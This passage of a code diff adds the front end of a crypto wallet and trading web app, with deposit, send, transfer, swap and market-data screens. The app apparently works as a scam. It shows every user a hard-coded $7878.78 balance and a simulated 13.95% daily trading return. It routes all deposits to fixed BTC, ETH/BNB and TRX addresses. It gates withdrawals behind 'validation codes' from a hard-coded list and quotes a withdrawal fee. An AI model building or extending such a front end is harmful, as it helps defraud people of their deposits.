+            <input id="coinSearchInput" type="text" placeholder="Search for a coin" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors" aria-label="Search for a coin">
+            <div id="coinList" class="space-y-2 mt-4 max-h-[60vh] overflow-y-auto">
+                <div class="text-sm text-center text-[var(--muted)] py-4">Loading coins...</div>
+            </div>
+        </div>
+
+        <div id="deposit-step-2" class="hidden space-y-4">
+            <div class="flex items-center gap-3">
+                <button onclick="window.showDepositStep(1)" class="p-2 rounded-full hover:bg-white/5" aria-label="Back to coin list">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+                    </svg>
+                </button>
+                <h2 class="text-xl font-bold">Select Network</h2>
+            </div>
+            <div id="selectedCoinInfo" class="rounded-xl p-4 bg-[var(--panel)] flex items-center gap-4"></div>
+            <div class="rounded-xl p-4 bg-[var(--panel)]">
+                <div class="font-semibold mb-2">Available Networks</div>
+                <div class="space-y-3" id="networkList"></div>
+            </div>
+        </div>
+
+        <div id="deposit-step-3" class="hidden space-y-4 text-center">
+            <div class="flex items-center gap-3">
+                <button onclick="window.showDepositStep(2)" class="p-2 rounded-full hover:bg-white/5" aria-label="Back to network selection">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+                    </svg>
+                </button>
+                <h2 class="text-xl font-bold">Deposit Address</h2>
+            </div>
+            <div class="bg-[var(--panel)] rounded-xl p-6">
+                <div id="qrCodeContainer" class="p-4 bg-white rounded-lg inline-block"></div>
+                <div class="text-xs text-[var(--muted)] mt-4">Selected Network</div>
+                <div id="selectedNetworkInfo" class="text-sm font-semibold"></div>
+                <div id="depositAddressText" class="break-all font-mono text-xs mt-1"></div>
+                <p class="safe-note mt-4">Only send <span id="depositCoinSymbol"></span> to this address. Sending other assets may result in permanent loss.</p>
+                <button onclick="window.copyAddress()" class="btn-ghost mt-4 w-full">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                    Copy Address
+                </button>
+            </div>
+        </div>
+    </section>
+    
+    <section id="send" class="page px-4 py-4 hidden-page space-y-4">
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <div class="flex items-center justify-between mb-3">
+                <h2 class="font-semibold">Send Funds</h2>
+                <button onclick="window.showPage('home')" class="text-sm text-[var(--muted)]">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M19 12H5"></path>
+                        <polyline points="12 19 5 12 12 5"></polyline>
+                    </svg>
+                    Back
+                </button>
+            </div>
+            
+            <div id="sendForm" class="grid gap-4 mt-3">
+                <div class="flex flex-col gap-2">
+                    <label for="sendAddress" class="text-sm text-[var(--muted)]">Recipient Address:</label>
+                    <input type="text" id="sendAddress" placeholder="Enter address" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
+                </div>
+                <div class="flex flex-col gap-2">
+                    <label for="sendNetwork" class="text-sm text-[var(--muted)]">Select Network:</label>
+                    <select id="sendNetwork" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
+                        <option value="BTC">Bitcoin [BTC]</option>
+                        <option value="ETH">Ethereum [ERC-20]</option>
+                        <option value="BSC">BNB Smart Chain [BEP20]</option>
+                        <option value="TRC">Tron [TRC-20]</option>
+                    </select>
+                </div>
+                <div class="flex flex-col gap-2">
+                    <label for="sendAmount" class="text-sm text-[var(--muted)]">Amount:</label>
+                    <input type="number" id="sendAmount" placeholder="Enter amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
+                </div>
+                <p class="safe-note mt-1">Withdrawal fee: ~0.19 (BNB/ETH/etc. depending on network)</p>
+
+                <button id="sendConfirmBtn" class="btn-primary rounded-xl">Confirm Send</button>
+                <p id="sendStatus" class="text-sm text-center text-[var(--muted)]"></p>
+            </div>
+
+            <div id="sendValidationSection" class="hidden grid gap-4 mt-4">
+                <div class="flex flex-col gap-2">
+                    <label for="validationCode" class="text-sm text-[var(--muted)]">Enter Validation Code:</label>
+                    <input type="text" id="validationCode" placeholder="Enter code" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:focus:border-[var(--brand)] transition-colors">
+                </div>
+                <button id="validateCodeBtn" class="btn-primary rounded-xl">Submit Code</button>
+                <p id="validationStatus" class="text-sm text-center text-[var(--muted)]"></p>
+            </div>
+        </div>
+    </section>
+    
+    <section id="transfer" class="page px-4 py-4 hidden-page space-y-4">
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <h2 class="font-semibold mb-3">Transfer Funds</h2>
+            <div class="grid gap-4 mt-3">
+                <div class="flex flex-col gap-2">
+                    <label for="transferAmount" class="text-sm text-[var(--muted)]">Amount:</label>
+                    <input type="number" id="transferAmount" placeholder="Enter amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
+                </div>
+                <div class="flex flex-col gap-2">
+                    <label for="transferDirection" class="text-sm text-[var(--muted)]">Direction:</label>
+                    <select id="transferDirection" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
+                        <option value="toTrade">Transfer to Trade Account</option>
+                        <option value="toMain">Transfer to Main Wallet</option>
+                    </select>
+                </div>
+                <button id="transferBtn" class="btn-primary rounded-xl">Transfer</button>
+                <p id="transferStatus" class="text-sm text-center text-[var(--muted)]"></p>
+                <button onclick="window.showPage('trade')" class="btn-ghost rounded-xl">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M19 12H5"></path>
+                        <polyline points="12 19 5 12 12 5"></polyline>
+                    </svg>
+                    Back to Trade
+                </button>
+            </div>
+        </div>
+    </section>
+
+</main>
+<nav class="h-16 border-t border-white/5 bg-[var(--panel)] grid grid-cols-4 text-center text-xs">
+    <button data-tab="home" class="tab py-3 tab-active" aria-label="Home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mx-auto mb-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+            <polyline points="9 22 9 12 15 12 15 22"></polyline>
+        </svg>
+        Home
+    </button>
+    <button data-tab="discover" class="tab py-3" aria-label="Discover">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mx-auto mb-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"></circle>
+            <polygon points="12 2 15 9 22 12 15 15 12 22 9 15 2 12 9 9 12 2"></polygon>
+        </svg>
+        Discover
+    </button>
+    <button data-tab="trade" class="tab py-3" aria-label="Trade">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mx-auto mb-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M15 12L9 6l-6 6"></path>
+            <path d="M9 18l6-6-6-6"></path>
+        </svg>
+        Trade
+    </button>
+    <button data-tab="memes" class="tab py-3" aria-label="Meme coins">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mx-auto mb-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 2a10 10 0 0 0-10 10 10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2z"></path>
+            <line x1="12" y1="16" x2="12" y2="16"></line>
+            <path d="M12 12s-2-1-4-2c0-1 1-2 4-2s4 1 4 2c-2 1-4 2-4 2z"></path>
+        </svg>
+        Meme
+    </button>
+</nav>
+
+<button id="installBtn" class="fixed bottom-20 right-4 btn-primary rounded-full px-5 py-3 hidden">Install App</button>
+
+<script>
+    // Service Worker
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('/sw.js').then(
+          registration => {
+            console.log('Service Worker registered: ', registration);
+            // Check for updates every hour
+            setInterval(() => registration.update(), 60 * 60 * 1000);
+          },
+          err => {
+            console.log('Service Worker registration failed: ', err);
+          }
+        );
+      });
+
+      // Prompt user to update when a new service worker is ready
+      navigator.serviceWorker.addEventListener('controllerchange', () => {
+        if (confirm('A new version is available. Refresh to update?')) {
+          window.location.reload();
+        }
+      });
+    }
+
+    let mainWalletBalance = 7878.78; // Starting balance
+    let tradeWalletBalance = 0.00;
+    let tradeEarnings = 0.00;
+    let tradeInterval;
+    const tradeDailyPercent = 0.1395;
+    
+    // Send / Withdraw Logic
+    const validCodes = ["483921", "175064", "902718", "634285", "217509", "856430", "490127", "731694", "562803", "308417", "941256", "128374", "675820", "203519", "487960", "819432", "356701", "740528", "612947", "098135", "573864", "284691", "160738", "495260", "837514", "021693", "658407", "794135", "320586", "946172"];
+    let sendAttempts = 0;
+    let sendSuspended = false;
+    let currentWallet = null;
+
+    // A helper function to get an element by ID
+    const get = (id) => document.getElementById(id);
+
+    function showModal(title, message) {
+        document.getElementById('modalTitle').textContent = title;
+        document.getElementById('modalMessage').textContent = message;
+        document.getElementById('modal').classList.remove('hidden');
+    }
+
+    function hideModal() {
+        document.getElementById('modal').classList.add('hidden');
+    }
+
+    function showPage(id) {
+        const pages = ['landing', 'loading', 'loading-disconnect', 'home', 'discover', 'swap', 'trade', 'memes', 'settings', 'deposit', 'send', 'transfer', 'dfi'];
+        pages.forEach(p => {
+            const el = document.getElementById(p);
+            if (!el) return;
+            el.classList.toggle('hidden-page', p !== id);
+        });
+
+        document.querySelectorAll('nav .tab').forEach(t => {
+            t.classList.toggle('tab-active', t.dataset.tab === id);
+        });
+
+        if (id === 'home') {
+            renderTV('tv_chart', 'BINANCE:BTCUSDT');
+            loadMovers();
+        }
+        if (id === 'trade') {
+            renderTV('tradeChart', 'BINANCE:BTCUSDT');
+            loadTradeAssets();
+        }
+        if (id === 'discover') loadDiscover();
+        if (id === 'memes') loadMemes();
+        if (id === 'settings') updateAccountWalletInfo();
+        if (id === 'swap') initSwapPage();
+        if (id === 'dfi') loadDFIPageData();
+    }
+
+    function updateHomeBalance() {
+        document.getElementById('totalBalance').innerText = '$' + mainWalletBalance.toFixed(2);
+    }
+
+    function updateWalletUI(address) {
+        currentWallet = address;
+        const accountId = generateNumericAccountId();
+        document.getElementById('netTag').textContent = `Connected`;
+        document.getElementById('accountId').textContent = accountId;
+        document.getElementById('homeAccountId').textContent = accountId;
+        document.getElementById('walletAddr').textContent = address;
+        document.getElementById('userIdDisplay').textContent = accountId;
+        updateHomeBalance();
+        updateAccountWalletInfo();
+    }
+    
+    function generateNumericAccountId() {
+        const now = Date.now().toString();
+        const randomPart = Math.floor(Math.random() * 90000000) + 10000000;
+        const hash = now.substring(now.length - 2) + randomPart.toString();
+        return hash.substring(0, 10);
+    }
+
+    async function updateAccountWalletInfo() {
+        if (currentWallet) {
+            get('accountWalletAddress').innerText = currentWallet;
+            try {
+                // In a real app, this would fetch the actual balance
+                get('accountWalletBalance').innerText = '1.2345 ETH';
+            } catch (error) {
+                console.error("Failed to get balance:", error);
+                get('accountWalletBalance').innerText = 'N/A';
+            }
+        } else {
+            get('accountWalletAddress').innerText = 'Not connected';
+            get('accountWalletBalance').innerText = '0 ETH';
+        }
+    }
+
+    function openWalletModal() {
+        document.getElementById('walletModal').classList.remove('hidden');
+    }
+
+    function closeWalletModal() {
+        document.getElementById('walletModal').classList.add('hidden');
+    }
+
+    function copyText(txt) {
+        navigator.clipboard.writeText(txt).then(() => showModal('Copied!', 'Address copied to clipboard.'));
+    }
+
+    function toggleSearch(open) {
+        document.getElementById('searchSheet').classList.toggle('hidden', !open);
+    }
+
+    window.showModal = showModal;
+    window.hideModal = hideModal;
+    window.showPage = showPage;
+    window.updateWalletUI = updateWalletUI;
+    window.openWalletModal = openWalletModal;
+    window.closeWalletModal = closeWalletModal;
+    window.copyText = copyText;
+    window.toggleSearch = toggleSearch;
+    window.updateAccountWalletInfo = updateAccountWalletInfo;
+
+    // PWA Install Logic
+let deferredPrompt = null;
+
+// Elements
+const installBtn = document.getElementById('installBtn');
+const getAppBtn = document.getElementById('getAppBtn');
+
+// Listen for beforeinstallprompt event
+window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredPrompt = e;             
+    installBtn.classList.remove('hidden'); // Show the install button
+    console.log('PWA install prompt available.');
+});
+
+// Handle install button click
+installBtn.addEventListener('click', async () => {
+    if (!deferredPrompt) return;  // Do nothing if prompt is not available
+
+    deferredPrompt.prompt();       // Show the install prompt
+    await deferredPrompt.userChoice;
+    deferredPrompt = null;         // Clear stored prompt
+    installBtn.classList.add('hidden'); // Hide install button after prompt
+});
+
+// Handle external "Get App" button click
+getAppBtn.addEventListener('click', () => {
+    if (deferredPrompt) {
+        installBtn.click();       // Trigger the install button
+    }
+});
+
+    // TradingView widgets
+    function renderTV(containerId, symbol) {
+        if (!window.TradingView) {
+            console.error("TradingView or container element is not available.");
+            return;
+        }
+        new TradingView.widget({
+            autosize: true,
+            symbol: symbol,
+            interval: '60',
+            timezone: 'Etc/UTC',
+            theme: 'dark',
+            style: '1',
+            locale: 'en',
+            toolbar_bg: '#0d0f14',
+            hide_side_toolbar: false,
+            container_id: containerId
+        });
+    }
+
+    // CoinGecko Data
+    const cgHeaders = { 'accept': 'application/json' };
+    
+    // Automatic Refresh Logic
+    const REFRESH_INTERVAL = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
+    const API_URLS = {
+        market: 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false',
+        movers: 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false',
+        global: 'https://api.coingecko.com/api/v3/global',
+        trending: 'https://api.coingecko.com/api/v3/search/trending',
+        dfiPrice: 'https://api.coingecko.com/api/v3/simple/price?ids=defichain&vs_currencies=usd'
+    };
+
+    async function fetchData(key, url, setterFunc) {
+        const lastRefresh = localStorage.getItem(`${key}LastRefresh`);
+        const cachedData = localStorage.getItem(key);
+        const now = Date.now();
+
+        if (cachedData && now - lastRefresh < REFRESH_INTERVAL) {
+            setterFunc(JSON.parse(cachedData), true);
+            return;
+        }
+
+        try {
+            const r = await fetch(url, { headers: cgHeaders });
+            if (!r.ok) throw new Error(`HTTP error! status: ${r.status}`);
+            const data = await r.json();
+            localStorage.setItem(key, JSON.stringify(data));
+            localStorage.setItem(`${key}LastRefresh`, now);
+            setterFunc(data, false);
+        } catch (e) {
+            console.error(`Failed to fetch ${key} data:`, e);
+            if (cachedData) {
+                showModal('Offline Mode', `Using cached data for ${key}.`);
+                setterFunc(JSON.parse(cachedData), true);
+            } else {
+                showModal('Offline Mode', `Could not fetch ${key} data and no cache available.`);
+                setterFunc(null, false);
+            }
+        }
+    }
+
+    async function loadMarket() {
+        const list = document.getElementById('marketList');
+        const setter = (data, isCached) => {
+            if (!data) {
+                list.innerHTML = '<div class="py-6 text-center text-sm text-[var(--muted)]">Failed to load market data.</div>';
+                return;
+            }
+            list.innerHTML = data.map(c => {
+                const ch = (c.price_change_percentage_24h || 0).toFixed(2);
+                const up = ch >= 0;
+                return `<div class="flex items-center justify-between py-3">
+                    <div class="flex items-center gap-3">
+                        <img src="${c.image}" class="w-7 h-7 rounded-full" alt="${c.symbol}">
+                        <div>
+                            <div class="font-semibold text-sm">${c.name}</div>
+                            <div class="text-[11px] text-[var(--muted)]">${c.symbol.toUpperCase()}</div>
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <div class="font-semibold">$${c.current_price.toLocaleString()}</div>
+                        <div class="text-[11px] ${up ? 'text-[var(--accent)]' : 'text-[var(--danger)]'}">${up ? '+' : ''}${ch}%</div>
+                    </div>
+                </div>`;
+            }).join('');
+            if (isCached) showSnackbar('Using cached market data');
+        };
+        list.innerHTML = '<div class="py-6 text-center text-sm text-[var(--muted)]">Loading…</div>';
+        fetchData('marketData', API_URLS.market, setter);
+    }
+    
+    document.getElementById('refreshMarket').addEventListener('click', loadMarket);
+    
+    async function loadMovers() {
+        const list = document.getElementById('moversList');
+        const setter = (data, isCached) => {
+            if (!data) {
+                list.innerHTML = '<div class="py-4 text-center text-sm text-[var(--muted)]">Failed to load.</div>';
+                return;
+            }
+            const movers = data.sort((a, b) => Math.abs(b.price_change_percentage_24h || 0) - Math.abs(a.price_change_percentage_24h || 0)).slice(0, 8);
+            list.innerHTML = movers.map(c => {
+                const ch = (c.price_change_percentage_24h || 0).toFixed(2);
+                const up = ch >= 0;
+                return `<div class="flex items-center justify-between py-3">
+                    <div class="flex items-center gap-3">
+                        <img src="${c.image}" class="w-7 h-7 rounded-full" alt="${c.symbol}">
+                        <div class="font-semibold text-sm">${c.name}</div>
+                    </div>
+                    <div class="text-right">
+                        <div class="font-semibold">$${c.current_price.toLocaleString()}</div>
+                        <div class="text-[11px] ${up ? 'text-[var(--accent)]' : 'text-[var(--danger)]'}">${up ? '+' : ''}${ch}%</div>
+                    </div>
+                </div>`;
+            }).join('');
+        };
+        list.innerHTML = '<div class="py-4 text-center text-sm text-[var(--muted)]">Loading…</div>';
+        fetchData('moversData', API_URLS.movers, setter);
+    }
+    
+    document.getElementById('refreshMovers').addEventListener('click', loadMovers);
+
+    async function loadDiscover() {
+        const box = document.getElementById('discoverFeed');
+        const setter = async (globalData, isCached) => {
+            if (!globalData) {
+                box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed to load discover.</div>';
+                return;
+            }
+            const t = await (await fetch(API_URLS.trending, { headers: cgHeaders })).json();
+            const mcap = globalData.data.total_market_cap.usd.toLocaleString();
+            const dom = globalData.data.market_cap_percentage;
+            const domPairs = Object.keys(dom).slice(0, 6).map(k => `${k.toUpperCase()}: ${dom[k].toFixed(1)}%`).join(' · ');
+            const trending = t.coins.map(x => x.item).slice(0, 10).map(i => `<div class="flex items-center gap-3"><img class="w-6 h-6" src="${i.small}" alt="${i.name}"><div class="text-sm">${i.name} <span class="text-[11px] text-[var(--muted)]">${i.symbol}</span></div></div>`).join('');
+            box.innerHTML = `
+                <div class="rounded-xl p-4 bg-[var(--panel-2)]">
+                    <div class="text-xs text-[var(--muted)]">Global Market Cap</div>
+                    <div class="text-xl font-bold">$${mcap}</div>
+                    <div class="text-[11px] text-[var(--muted)] mt-1">Dominance · ${domPairs}</div>
+                </div>
+                <div class="rounded-xl p-4 bg-[var(--panel-2)]">
+                    <div class="font-semibold mb-2">Trending</div>
+                    <div class="grid grid-cols-2 gap-3">${trending}</div>
+                </div>`;
+        };
+        box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Loading…</div>';
+        fetchData('globalData', API_URLS.global, setter);
+    }
+    
+    async function loadMemes() {
+        const list = document.getElementById('memeList');
+        const setter = (data, isCached) => {
+            if (!data) {
+                list.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed to load trending.</div>';
+                return;
+            }
+            list.innerHTML = data.coins.map(x => x.item).map(i =>
+                `<div class='flex items-center justify-between rounded-xl p-3 bg-[var(--panel-2)]'>
+                    <div class='flex items-center gap-3'>
+                        <img class='w-8 h-8' src='${i.small}' alt="${i.name}"/>
+                        <div class='text-sm'>${i.name}<div class='text-[11px] text-[var(--muted)]'>${i.symbol}</div></div>
+                    </div>
+                    <div class='text-[11px] text-[var(--muted)]'>Rank ${i.market_cap_rank || '-'}</div>
+                </div>`
+            ).join('');
+        };
+        list.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Loading…</div>';
+        fetchData('memeData', API_URLS.trending, setter);
+    }
+
+    // Search modal
+    document.getElementById('searchOpen').addEventListener('click', () => window.toggleSearch(true));
+    document.getElementById('searchOpenDiscover').addEventListener('click', () => window.toggleSearch(true));
+    document.getElementById('searchInput').addEventListener('input', async (e) => {
+        const q = e.target.value.trim();
+        const box = document.getElementById('searchResults');
+        if (!q) {
+            box.innerHTML = '';
+            return;
+        }
+        try {
+            const r = await (await fetch('https://api.coingecko.com/api/v3/search?query=' + encodeURIComponent(q), { headers: cgHeaders })).json();
+            box.innerHTML = r.coins.slice(0, 20).map(c => `<div class='py-2 flex items-center gap-3'>
+                <img class='w-5 h-5' src='${c.thumb}' alt="${c.name}"/>
+                <div class='text-sm'>${c.name} <span class='text-[11px] text-[var(--muted)]'>${c.symbol}</span></div>
+            </div>`).join('');
+        } catch {
+            box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed.</div>';
+        }
+    });
+
+    // Deposit Logic
+    const depositAddresses = {
+        'BTC': { network: 'Bitcoin (BTC)', address: 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu' },
+        'ETH': { network: 'Ethereum (ERC-20)', address: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130' },
+        'BNB': { network: 'BNB Smart Chain (BEP20)', address: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130' },
+        'TRX': { network: 'Tron (TRC-20)', address: 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco' }
+    };
+
+    let allCoins = [];
+    let selectedCoin = null;
+
+    async function loadCoinList() {
+        const listContainer = document.getElementById('coinList');
+        listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">Loading coins...</div>';
+        try {
+            const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=250&page=1&sparkline=false');
+            allCoins = await res.json();
+            allCoins.sort((a, b) => a.name.localeCompare(b.name));
+            renderCoinList(allCoins);
+        } catch (e) {
+            listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">Failed to load coins.</div>';
+        }
+    }
+
+    function renderCoinList(coins) {
+        const listContainer = document.getElementById('coinList');
+        if (coins.length === 0) {
+            listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">No coins found.</div>';
+            return;
+        }
+        listContainer.innerHTML = coins.map(c => `
+            <button onclick="window.selectCoin('${c.id}', '${c.image}', '${c.name}', '${c.symbol}')" class="flex items-center gap-4 p-3 rounded-xl hover:bg-white/5 transition-colors w-full text-left">
+                <img src="${c.image}" class="w-8 h-8 rounded-full" onerror="this.onerror=null;this.src='https://placehold.co/32x32/1ea7fd/fff?text=?'"/>
+                <div class="flex-1">
+                    <div class="font-semibold text-sm">${c.name}</div>
+                    <div class="text-xs text-[var(--muted)]">${c.symbol.toUpperCase()}</div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[var(--muted)]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </button>
+        `).join('');
+    }
+
+    function startDepositFlow() {
+        showDepositStep(1);
+        loadCoinList();
+    }
+
+    function showDepositStep(step) {
+        document.getElementById('deposit-step-1').classList.add('hidden');
+        document.getElementById('deposit-step-2').classList.add('hidden');
+        document.getElementById('deposit-step-3').classList.add('hidden');
+        document.getElementById(`deposit-step-${step}`).classList.remove('hidden');
+    }
+
+    function selectCoin(id, image, name, symbol) {
+        selectedCoin = { id, image, name, symbol: symbol.toUpperCase() };
+        document.getElementById('selectedCoinInfo').innerHTML = `
+            <img src="${selectedCoin.image}" class="w-10 h-10 rounded-full" onerror="this.onerror=null;this.src='https://placehold.co/40x40/1ea7fd/fff?text=?'"/>
+            <div>
+                <div class="font-semibold">${selectedCoin.name}</div>
+                <div class="text-sm text-[var(--muted)]">${selectedCoin.symbol}</div>
+            </div>
+        `;
+        renderNetworkList();
+        showDepositStep(2);
+    }
+
+    function renderNetworkList() {
+        const networkList = document.getElementById('networkList');
+        networkList.innerHTML = '';
+        const networkKeys = ['BTC', 'ETH', 'BNB', 'TRX'];
+        networkKeys.forEach(key => {
+            const net = depositAddresses[key];
+            if (net) {
+                const button = document.createElement('button');
+                button.className = 'flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-colors w-full';
+                button.onclick = () => selectNetwork(key);
+                button.innerHTML = `
+                    <div class="flex items-center gap-3">
+                        <img src="https://via.placeholder.com/24/1ea7fd/fff?text=${key.toUpperCase()}" class="w-6 h-6 rounded-full" />
+                        <div class="font-semibold text-sm">${net.network}</div>
+                    </div>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[var(--muted)]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                    </svg>
+                `;
+                networkList.appendChild(button);
+            }
+        });
+    }
+
+    function selectNetwork(key) {
+        const net = depositAddresses[key];
+        const addr = net.address;
+        const qrContainer = document.getElementById('qrCodeContainer');
+        qrContainer.innerHTML = '';
+        new QRCode(qrContainer, addr);
+        document.getElementById('selectedNetworkInfo').textContent = net.network;
+        document.getElementById('depositAddressText').textContent = addr;
+        document.getElementById('depositCoinSymbol').textContent = selectedCoin.symbol;
+        showDepositStep(3);
+    }
+
+    function copyAddress() {
+        const addr = document.getElementById('depositAddressText').textContent;
+        window.copyText(addr);
+    }
+
+    window.startDepositFlow = startDepositFlow;
+    window.showDepositStep = showDepositStep;
+    window.selectCoin = selectCoin;
+    window.copyAddress = copyAddress;
+
+    document.getElementById('coinSearchInput').addEventListener('input', (e) => {
+        const query = e.target.value.toLowerCase();
+        const filteredCoins = allCoins.filter(c =>
+            c.name.toLowerCase().includes(query) || c.symbol.toLowerCase().includes(query)
+        );
+        renderCoinList(filteredCoins);
+    });
+
+    // DFI Page Logic
+    async function loadDFIPageData() {
+        const dfiPriceEl = document.getElementById('dfiBalance');
+        const dfiFiatBalanceEl = document.getElementById('dfiFiatBalance');
+        const dfiChartEl = document.getElementById('dfiChart');
+        const dfiTransactionsEl = document.getElementById('dfiTransactions');
+        
+        // Load price data
+        fetchData('dfiPrice', API_URLS.dfiPrice, (data) => {
+            if (data && data.defichain && data.defichain.usd) {
+                const price = data.defichain.usd;
+                dfiPriceEl.textContent = `${(100).toFixed(2)} DFI`; // Static DFI balance for demo
+                dfiFiatBalanceEl.textContent = `$${(100 * price).toFixed(2)}`;
+            }
+        });
+
+        // Simulating transactions
+        const transactions = [
+            { type: 'Sent', amount: -5.00, timestamp: '2024-09-02 10:30 AM' },
+            { type: 'Received', amount: 20.00, timestamp: '2024-09-01 02:15 PM' },
+            { type: 'Sent', amount: -10.00, timestamp: '2024-08-30 08:00 PM' }
+        ];
+
+        dfiTransactionsEl.innerHTML = transactions.map(tx => `
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-2">
+                    <div class="w-8 h-8 rounded-full bg-gray-700 flex items-center justify-center">
+                        ${tx.type === 'Sent' ? '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="19" y1="12" x2="5" y2="12"></line></svg>' : '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><polyline points="19 12 12 19 5 12"></polyline></svg>'}
+                    </div>
+                    <div>
+                        <div class="font-semibold">${tx.type} DFI</div>
+                        <div class="text-xs text-[var(--muted)]">${tx.timestamp}</div>
+                    </div>
+                </div>
+                <div class="${tx.amount > 0 ? 'text-green-500' : 'text-red-500'} font-semibold">${tx.amount.toFixed(2)} DFI</div>
+            </div>
+        `).join('');
+
+        // Render TradingView chart for DFI
+        renderTV('dfiChart', 'BITTREX:DFIUSD');
+    }
+
+    // Swap Logic
+    let isFromToken = true;
+    let fromToken = { symbol: 'ETH', icon: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png?1595348880' };
+    let toToken = { symbol: 'BTC', icon: 'https://assets.coingecko.com/coins/images/1/small/bitcoin.png?1547033579' };
+    let swapTokens = [];
+    
+    // Uniswap Token Lists API (demo with a placeholder)
+    // To switch, replace this URL with a different valid token list JSON, e.g.,
+    // 'https://tokens.coingecko.com/uniswap/all.json'
+    const tokenListUrl = 'https://tokens.uniswap.org/tokens.json'; 
+
+    async function fetchSwapTokens() {
+      try {
+        const res = await fetch(tokenListUrl);
+        const data = await res.json();
+        // Use a subset of tokens for the demo
+        swapTokens = data.tokens.slice(0, 50); 
+        updateSwapTokensUI();
+      } catch (e) {
